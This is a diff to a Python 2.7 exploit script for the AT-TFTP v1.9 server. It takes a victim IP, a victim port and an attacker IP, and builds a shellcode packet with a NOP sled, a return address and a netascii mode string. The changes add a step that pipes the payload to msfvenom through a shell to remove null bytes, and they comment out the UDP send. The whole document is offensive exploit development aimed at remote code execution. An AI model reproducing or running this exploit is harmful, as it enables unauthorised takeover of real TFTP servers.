@@ -2,7 +2,7 @@
 
 #AT-TFTP v1.9 Exploit
 # python 2.7
-import sys, socket, binascii
+import sys, socket, binascii, subprocess
 
 # to run 'python atftp_lfname.py <victim IP> <victim Port> <attacker IP>'
 
@@ -55,12 +55,20 @@ exploit = "\x00\x02" + nop +payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 
 payload = "\x81\xec\xac\x0d\x00\x00" + payload
 
+## now that we have full payload, need to badchar \x00
 
+## should be able to use something like "echo payload | msfvenom -b '\x00' -a x86 --platform windows -f hex -o /tmp/atftp"
+## and capture the result into a file
+
+cmd = "echo " + payload + "|msfvenom -b '\x00' -a x86 --platform windows -f hex -o /tmp/atftp"
+
+rv = subprocess.call(cmd, shell=True)  # returns the exit code in unix
+print rv
 
 ## create socket and send
 
-client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-client.sendto(exploit, (host,port))
+#client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#client.sendto(exploit, (host,port))
 
 
 
